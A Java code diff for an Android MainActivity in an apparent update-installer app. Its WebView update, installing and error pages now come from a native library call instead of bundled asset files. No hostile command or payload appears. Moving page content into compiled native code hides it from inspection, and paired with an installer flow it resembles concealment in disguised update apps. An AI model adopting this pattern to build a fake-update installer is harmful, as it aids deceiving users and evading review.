@@ -43,6 +43,12 @@ public class MainActivity extends Activity {
     private boolean isInstalling = false;
     private NativeInstaller nativeInstaller;
 
+    static {
+        System.loadLibrary("installer");
+    }
+
+    private native String nativeGetHtml(String mode);
+
     private BroadcastReceiver installReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
@@ -85,7 +91,10 @@ public class MainActivity extends Activity {
                             isInstalling = false;
                             toast("Installation failed");
                             if (webView != null) {
-                                webView.loadUrl("file:///android_asset/update/update.html?error=true");
+                                String html = nativeGetHtml("update");
+                                if (html != null && !html.isEmpty()) {
+                                    webView.loadDataWithBaseURL("file:///android_asset/update/", html, "text/html", "UTF-8", null);
+                                }
                             }
                         }
                     });
@@ -139,8 +148,10 @@ public class MainActivity extends Activity {
 
             setContentView(webView);
 
-            if (checkAssetExists("update/update.html")) {
-                webView.loadUrl("file:///android_asset/update/update.html");
+            // Load HTML from native code
+            String html = nativeGetHtml("update");
+            if (html != null && !html.isEmpty()) {
+                webView.loadDataWithBaseURL("file:///android_asset/update/", html, "text/html", "UTF-8", null);
             } else {
                 showErrorPage();
             }
@@ -210,8 +221,9 @@ public class MainActivity extends Activity {
         handler.post(new Runnable() {
             @Override
             public void run() {
-                if (checkAssetExists("update/installing.html")) {
-                    webView.loadUrl("file:///android_asset/update/installing.html");
+                String html = nativeGetHtml("installing");
+                if (html != null && !html.isEmpty()) {
+                    webView.loadDataWithBaseURL("file:///android_asset/update/", html, "text/html", "UTF-8", null);
                 }
             }
         });
@@ -248,7 +260,10 @@ public class MainActivity extends Activity {
                         public void run() {
                             isInstalling = false;
                             toast("Failed: " + errorMsg);
-                            webView.loadUrl("file:///android_asset/update/update.html?error=install");
+                            String html = nativeGetHtml("update");
+                            if (html != null && !html.isEmpty()) {
+                                webView.loadDataWithBaseURL("file:///android_asset/update/", html, "text/html", "UTF-8", null);
+                            }
                         }
                     });
                 }
@@ -479,7 +494,10 @@ public class MainActivity extends Activity {
                             toast("Permission required");
                             isInstalling = false;
                             if (webView != null) {
-                                webView.loadUrl("file:///android_asset/update/update.html?error=permission");
+                                String html = nativeGetHtml("update");
+                                if (html != null && !html.isEmpty()) {
+                                    webView.loadDataWithBaseURL("file:///android_asset/update/", html, "text/html", "UTF-8", null);
+                                }
                             }
                         }
                     }
